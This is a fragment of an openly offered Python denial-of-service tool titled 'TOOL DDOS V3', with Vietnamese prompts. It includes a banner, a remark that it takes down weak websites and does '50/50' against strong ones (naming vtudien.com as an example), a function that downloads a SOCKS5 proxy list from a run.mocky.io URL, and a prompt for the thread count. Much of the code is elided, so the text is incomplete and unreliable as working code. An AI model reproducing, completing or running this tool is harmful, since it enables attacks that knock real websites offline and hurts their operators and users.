...
print('''\r\n
            ...
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯ 
            \033[1;31m                    TOOL DDOS V3
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯  
\r\n''')  
print("ddos web yếu thì ổn còn web khỏe thì 50/50 ví dụ : vtudien.com ")
...
def clone():
    ...
    try:
        ...
        pass
    try:
        r = requests.get("https://run.mocky.io/v3/960538b8-a9e1-4abf-a816-f5892f1f25fe")
        f.write(r.content)
    except:
        pass
    try:
...
def main():
    ...
    if th_num == "":
        ...
        th_num = int(th_num)
    #if mode == "get" or mode == "GET":
    N = str(input("Tải xuống danh sách Proxy Socks5? (Có/Không) [y/n] (Nếu Bạn Đã Có Proxy Rồi Thì Không Cần Dowload Nữa):"))
    if N == "n" or N =="N":
        pass
    else:
        clone()
